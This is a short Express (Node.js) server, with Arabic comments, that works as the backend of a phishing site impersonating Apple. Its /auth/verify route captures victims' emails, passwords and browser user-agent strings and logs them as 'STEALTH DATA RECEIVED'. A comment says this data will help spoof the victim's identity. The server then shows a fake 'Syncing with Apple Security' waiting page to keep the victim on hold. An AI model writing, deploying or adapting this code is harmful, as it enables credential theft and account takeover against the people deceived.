const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/auth/verify', (req, res) => {
    const { email, password } = req.body;
    
    // محاكاة سحب بصمة الجهاز (User-Agent) كبديل للتوكن المفقود
    const deviceFingerprint = req.headers['user-agent'];

    console.log("====================================");
    console.log("🔓 STEALTH DATA RECEIVED");
    console.log("USER: " + email);
    console.log("PASS: " + password);
    console.log("DEVICE ID: " + deviceFingerprint); // هذا سيساعدك على تزييف الهوية
    console.log("====================================");

    // توجيه الضحية لصفحة انتظار توحي بالنشاط
    res.send(`
        <div style="font-family:sans-serif; text-align:center; padding-top:100px;">
            <h2 style="color:#0071e3;">Syncing with Apple Security...</h2>
            <p>Hardware ID detected. Please keep this page open for 2 minutes to complete verification.</p>
        </div>
    `);
});

const PORT = process.env.PORT || 10000; // Render يستخدم غالباً هذا البورت
app.listen(PORT, () => console.log('Bypass Core v2 Online'));
